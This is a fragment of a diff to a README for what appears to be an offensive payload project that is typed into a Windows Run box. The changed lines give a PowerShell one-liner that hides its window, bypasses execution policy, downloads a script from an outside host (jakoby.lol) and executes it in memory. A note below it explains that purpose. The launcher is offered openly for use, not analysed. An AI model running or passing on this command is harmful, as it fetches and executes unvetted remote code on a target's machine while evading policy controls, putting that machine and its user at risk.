@@ -38,7 +38,7 @@ The generated image will be saved to the desktop and steganography is used to pu
 ### Executing program
 
 ```
-powershell -w h -NoP -NonI -Exec Bypass iwr jakoby.lol/zyg | iex
+powershell -w h -NoP -NonI -Exec Bypass irm jakoby.lol/zyg | iex
 ```
 
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
